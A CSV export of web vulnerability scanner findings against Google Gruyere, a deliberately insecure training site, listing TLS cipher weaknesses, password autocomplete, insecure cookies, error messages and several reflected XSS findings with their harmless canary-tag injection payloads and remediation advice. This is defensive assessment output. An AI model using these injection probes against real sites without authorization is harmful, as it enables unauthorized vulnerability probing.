"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The remote server is not configured with a SSL/TLS cipher suite preference list, making the cipher suite selection during the negotiation use the ordered list from the client.",SSL/TLS,112599,"SSL/TLS Server Cipher Suite Preference Not Detected",,2020-09-24T00:00:00Z,2021-08-25T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://wiki.mozilla.org/Security/Server_Side_TLS, http://www.exploresecurity.com/testing-for-cipher-suite-preference/",Info,,,"65bc235f-9d2b-4df8-892e-b6a135de4e79",2022-03-15T18:42:41.743Z,2022-03-15T16:46:11Z,"The scanner detected that the remote host is not configured with a cipher suite preference for the following protocol(s) : TLS v1.2, TLS v1.3",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The Hypertext Transfer Protocol (HTTP) is the underlying protocol of the World Wide Web. Since its first release, HTTP has evolved to support modern web usages and currently exists in four versions:
 - HTTP/0.9
 - HTTP/1.0
 - HTTP/1.1
 - HTTP/2

The scanner identified the supported versions of the HTTP protocol on the target web application.","Web Applications",112613,"Allowed HTTP Versions",,2020-10-13T00:00:00Z,2020-10-13T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP",Info,,,"67f499d0-f06b-43e9-826d-9420175e525c",2022-03-15T18:42:41.743Z,2022-03-15T16:44:57Z,"The scanner detected the following HTTP versions on the target application : 

- HTTP/1.0
- HTTP/1.1

The list of requests and responses observed is provided in attachment.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.7,"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N","The remote host supports the use of SSL/TLS ciphers that offer weak encryption (including RC4 and 3DES encryption).",SSL/TLS,112539,"SSL/TLS Weak Cipher Suites Supported",,2019-01-21T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A7], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[326], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]",,Low,"Reconfigure the affected application, if possible to avoid the use of weak ciphers.",,"6823f9ac-1e6e-4d72-b3d2-f7919e8bed5a",2022-03-15T18:42:41.743Z,2022-03-15T16:46:10Z,"Protocol     Cipher Suite Name (RFC)             
------------------------------------
TLS 1.1      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS 1.1      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS 1.1      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA  
TLS 1.1      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA  
TLS 1.1      TLS_RSA_WITH_AES_128_CBC_SHA        
TLS 1.1      TLS_RSA_WITH_AES_256_CBC_SHA        
TLS 1.1      TLS_RSA_WITH_3DES_EDE_CBC_SHA       
TLS 1.0      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS 1.0      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS 1.0      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA  
TLS 1.0      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA  
TLS 1.0      TLS_RSA_WITH_AES_128_CBC_SHA        
TLS 1.0      TLS_RSA_WITH_AES_256_CBC_SHA        
TLS 1.0      TLS_RSA_WITH_3DES_EDE_CBC_SHA       
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS 1.2      TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA  
TLS 1.2      TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA  
TLS 1.2      TLS_RSA_WITH_AES_128_GCM_SHA256     
TLS 1.2      TLS_RSA_WITH_AES_256_GCM_SHA384     
TLS 1.2      TLS_RSA_WITH_AES_128_CBC_SHA        
TLS 1.2      TLS_RSA_WITH_AES_256_CBC_SHA        
TLS 1.2      TLS_RSA_WITH_3DES_EDE_CBC_SHA       
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"682a2299-0d3c-4b1a-b094-91b5f7351c10",2022-03-15T21:06:17.432Z,2022-03-15T19:19:49Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/newsnippet.gtl with input fields : 
- snippet (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/newsnippet2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"6e3f7d8c-e335-4fec-b0bf-bdc90cf205bf",2022-03-15T18:42:41.743Z,2022-03-15T16:49:31Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/361357029172560933265350706939995878846/login"">
  <input type=""text"" name=""uid"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""submit"" value=""Login"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"6f424b47-1ecf-4022-8a87-bd4e33dc9d03",2022-03-15T21:06:17.432Z,2022-03-15T16:12:47Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/&amp' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"737b5647-328e-47cb-844c-aa8a8d6af842",2022-03-15T18:42:41.743Z,2022-03-15T17:25:37Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl with input fields : 
- snippet (no type specified)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"73feaf75-1f70-427f-8f77-b472b7e02cda",2022-03-15T21:06:17.432Z,2022-03-15T14:04:34Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"75602c2c-d709-4c0b-8fbd-592a02ae6a1f",2022-03-15T18:42:41.743Z,2022-03-15T17:04:04Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"75a7c331-4577-44d2-9f22-5f9407657190",2022-03-15T18:42:41.743Z,2022-03-15T16:44:03Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | /><my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"765295a7-8845-4f3f-b683-632eb068ac6e",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"On https://google-gruyere.appspot.com/start debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"79518e6d-c405-4a77-940d-a24105ce657d",2022-03-15T18:42:41.743Z,2022-03-15T16:59:56Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This plugin displays information about the X.509 certificate extracted from the HTTPS connection.",SSL/TLS,112491,"SSL/TLS Certificate Information",,2018-10-03T00:00:00Z,2020-10-02T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"7db899d2-13fa-4f90-bb51-9f3a0aca7dd7",2022-03-15T18:42:41.743Z,2022-03-15T16:45:34Z,"
Certificate 1
--------------
Common Name: *.appspot.com
Alternative Names: *.appspot.com appspot.com *.de.r.appspot.com *.df.r.appspot.com *.an.r.appspot.com *.dt.r.appspot.com *.du.r.appspot.com *.el.r.appspot.com *.as.r.appspot.com *.et.r.appspot.com *.ts.r.appspot.com *.lz.r.appspot.com *.ew.r.appspot.com *.nw.r.appspot.com *.ey.r.appspot.com *.ez.r.appspot.com *.nz.r.appspot.com *.oa.r.appspot.com *.nn.r.appspot.com *.rj.r.appspot.com *.uc.r.appspot.com *.tz.r.appspot.com *.ue.r.appspot.com *.uk.r.appspot.com *.uw.r.appspot.com *.wl.r.appspot.com *.wm.r.appspot.com *.wn.r.appspot.com *.lm.r.appspot.com *.em.r.appspot.com *.km.r.appspot.com *.pd.r.appspot.com *.ui.r.appspot.com thinkwithgoogle.com *.thinkwithgoogle.com thinkwithgoogle.goog *.thinkwithgoogle.goog withgoogle.com *.withgoogle.com api.projectshield.withgoogle.com withyoutube.com *.withyoutube.com app.google *.app.google
Issuer: Google Trust Services LLC
Valid from: 2022-02-17 10:07:54 UTC
Valid until: 2022-05-12 10:07:53 UTC (expires in 1 month, 3 weeks, 6 days)
Validity Period: 83 days
Key: RSA 256-bit
Signature: sha256WithRSAEncryption

Certificate 2
--------------
Common Name: gts ca 1c
Issuer: Google Trust Services LLC
Valid from: 2020-08-13 00:00:42 UTC
Valid until: 2027-09-30 00:00:42 UTC (expires in 5 years, 6 months, 2 weeks, 1 day)
Validity Period: 2604 days
Key: RSA 2048-bit
Signature: sha256WithRSAEncryption

Certificate 3
--------------
Common Name: gts root r
Issuer: GlobalSign nv
Valid from: 2020-06-19 00:00:42 UTC
Valid until: 2028-01-28 00:00:42 UTC (expires in 5 years, 10 months, 1 week, 6 days)
Validity Period: 2779 days
Key: RSA 4096-bit
Signature: sha256WithRSAEncryption
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","When the `secure` flag is set on a cookie, the browser will prevent it from being sent over a clear text channel (HTTP) and only allow it to be sent when an encrypted channel is used (HTTPS).

The scanner discovered that a cookie was set by the server without the secure flag being set. Although the initial setting of this cookie was via an HTTPS connection, any HTTP link to the same server will result in the cookie being sent in clear text.

Note that if the cookie does not contain sensitive information, the risk of this vulnerability is mitigated.","Web Applications",98064,"Cookie Without Secure Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[614], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://www.owasp.org/index.php/SecureFlag",Low,"If the cookie contains sensitive information, then the server should ensure that the cookie has the `secure` flag set.",,"7dbd639a-5fc7-4c32-a66c-c55666de8ac9",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"The scanner detected a cookie named 'GRUYERE_ID' without the Secure flag set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The design of many web applications require that users be able to upload files that will either be stored or processed by the receiving web server.

Scanner has flagged this not as a vulnerability, but as a prompt for the penetration tester to conduct further manual testing on the file upload function.

An insecure form-based file upload could allow a cyber-criminal a means to abuse and successfully exploit the server directly, and/or any third party that may later access the file. This can occur through uploading a file containing server side-code (such as PHP) that is then executed when requested by the client.","Web Applications",98080,"Form-based File Upload",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Unrestricted_File_Upload",Info,"The identified page should at a minimum:
1. Whitelist permitted file types and block all others. This should be conducted on the MIME type of the file rather than its extension. 2. As the file is uploaded, and prior to being handled (written to the disk) by the server, the filename should be stripped of all control, special, or Unicode characters. 3. Ensure that the upload is conducted via the HTTP `POST` method rather than `GET` or `PUT`. 4. Ensure that the file is written to a directory that does not hold any execute permission and that all files within that directory inherit the same permissions. 5. Scan (if possible) with an up-to-date virus scanner before being stored. 6. Ensure that the application handles files as per the host operating system. For example, the length of the file name is appropriate, there is adequate space to store the file, protection against overwriting other files etc.",,"7dcff3fd-2d4e-4c75-955d-cd9584f47237",2022-03-15T21:06:17.432Z,2022-03-15T18:56:26Z,"The scanner detected the presence of a file upload functionnality in a form returned by the target application.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"81822874-6485-4a57-8f78-a84c715de5b8",2022-03-15T21:06:17.432Z,2022-03-15T15:30:41Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/login"">
  <input type=""text"" name=""uid"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""submit"" value=""Login"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"819c9502-b5ac-4afb-9e7b-90308c57470d",2022-03-15T18:42:41.743Z,2022-03-15T17:17:24Z,"On http://google-gruyere.appspot.com/start debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"819e85e4-705b-4b84-8c63-17cba827e6e4",2022-03-15T18:42:41.743Z,2022-03-15T17:52:08Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/425575187579520270957883614548769509881' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

